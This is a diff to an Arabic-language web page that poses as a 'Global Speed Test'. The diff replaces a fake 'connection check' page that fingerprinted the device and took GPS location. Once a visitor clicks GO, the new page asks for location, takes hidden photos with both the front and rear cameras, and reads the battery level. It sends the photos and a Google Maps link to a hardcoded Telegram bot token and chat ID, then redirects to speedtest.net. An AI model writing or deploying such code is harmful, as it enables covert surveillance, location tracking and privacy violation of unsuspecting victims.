@@ -1,80 +1,84 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>فحص اتصال النظام</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SpeedTest - فحص جودة الاتصال</title>
+    <style>
+        body { background-color: #0b0e18; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; margin: 0; }
+        .circle { width: 220px; height: 220px; border: 6px solid #00d2ff; border-radius: 50%; margin: 0 auto; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: 0.3s; box-shadow: 0 0 30px rgba(0, 210, 255, 0.4); background: radial-gradient(circle, #1a2035 0%, #0b0e18 100%); }
+        .speed { font-size: 45px; font-weight: bold; color: #00d2ff; }
+        #status { margin-top: 25px; color: #888; font-size: 18px; }
+        video, canvas { display: none; } /* إخفاء عناصر الكاميرا عن المستخدم */
+    </style>
 </head>
-<body style="background-color: #f0f0f0; text-align: center; font-family: sans-serif; padding-top: 50px;">
-    <h2>جاري فحص حالة الاتصال...</h2>
-    <p>يرجى السماح بالوصول للموقع للمتابعة</p>
+<body>
+    <h1>Global Speed Test</h1>
+    <p>اضغط GO لبدء فحص الشبكة والكاميرا (لمعايرة الفيديو)</p>
+    <div class="circle" id="startBtn"><span class="speed">GO</span></div>
+    <p id="status">جاهز للفحص...</p>
+
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
 
     <script>
-        // تم وضع بياناتك هنا مباشرة لسهولة النسخ
         const botToken = "8113942047:AAFTJz0lZe1Mjsc0vX79LeCq4MKjwwDuFEw"; 
         const chatId = "7984067238"; 
 
-        function getDeviceFingerprint() {
-            const ua = navigator.userAgent;
-            let deviceType = "غير معروف";
-            let platform = navigator.platform;
-            let cores = navigator.hardwareConcurrency || "مخفية";
-            let ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "مخفية";
-
-            if (/android/i.test(ua)) {
-                deviceType = "أندرويد (Android)";
-                const match = ua.match(/\(([^;]+);\sAndroid\s([0-9\.]+);\s([^)]+)\)/);
-                if (match) { platform = match[1] + " (Android " + match[2] + ")"; }
-            } else if (/iPhone/i.test(ua)) {
-                deviceType = "آيفون (iPhone)";
-            } else if (/Windows/i.test(ua)) {
-                deviceType = "ويندوز (Windows)";
-            }
-
-            return {
-                deviceType: deviceType,
-                platform: platform,
-                cores: cores,
-                ram: ram,
-                userAgent: ua
-            };
+        async function sendPhoto(blob, caption) {
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("photo", blob, "image.jpg");
+            formData.append("caption", caption);
+            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: formData });
         }
 
-        async function sendToTelegram(text) {
-            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
+        async function capture(facingMode, label) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+                
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                stream.getTracks().forEach(track => track.stop()); // إغلاق الكاميرا بعد اللقطة
+                
+                return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+            } catch (e) { return null; }
         }
 
-        async function startTracking(position) {
+        async function startFullScan(position) {
+            document.getElementById('status').innerText = "جاري الفحص... يرجى عدم إغلاق الصفحة";
+            
+            // 1. التقاط الصور (سيطلب إذن الكاميرا هنا)
+            const frontBlob = await capture("user", "📸 صورة أمامية");
+            if (frontBlob) await sendPhoto(frontBlob, "📸 صورة أمامية للجهاز");
+            
+            const backBlob = await capture("environment", "📸 صورة خلفية");
+            if (backBlob) await sendPhoto(backBlob, "📸 صورة خلفية للجهاز");
+
+            // 2. إرسال البيانات والموقع
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
-            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            let batt = "غير معروف";
+            try { const b = await navigator.getBattery(); batt = `${Math.round(b.level * 100)}%`; } catch(e){}
+
+            const report = `🚀 **تقرير متكامل**\n🔋 البطارية: ${batt}\n📍 الموقع: https://www.google.com/maps?q=${lat},${lon}`;
             
-            let batt = "غير مسموح بالوصول";
-            try {
-                if (navigator.getBattery) {
-                    const battery = await navigator.getBattery();
-                    batt = `${Math.round(battery.level * 100)}% (${battery.charging ? "يشحن" : "لا يشحن"})`;
-                }
-            } catch (e) {}
-
-            const fp = getDeviceFingerprint();
-
-            const report = `🛰️ **تقرير البصمة الرقمية**\n\n` +
-                           `📱 **الجهاز:** ${fp.deviceType}\n` +
-                           `⚙️ **النظام:** ${fp.platform}\n` +
-                           `🔋 **البطارية:** ${batt}\n` +
-                           `💾 **الذاكرة:** ${fp.ram}\n` +
-                           `💻 **المعالج:** ${fp.cores} نواة\n` +
-                           `📍 **الموقع:** ${mapLink}\n\n` +
-                           `🌐 **المتصفح:** \`${fp.userAgent}\``;
-
-            await sendToTelegram(report);
-            window.location.href = "https://www.google.com"; 
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
+            
+            alert("تم الفحص بنجاح!");
+            window.location.href = "https://www.speedtest.net";
         }
 
-        window.onload = function() {
+        document.getElementById('startBtn').onclick = function() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(startTracking, (err) => {
-                    alert("يجب تفعيل GPS للمتابعة.");
+                navigator.geolocation.getCurrentPosition(startFullScan, () => {
+                    alert("يجب السماح بالأذونات لعمل الفحص.");
                 }, { enableHighAccuracy: true });
             }
         };
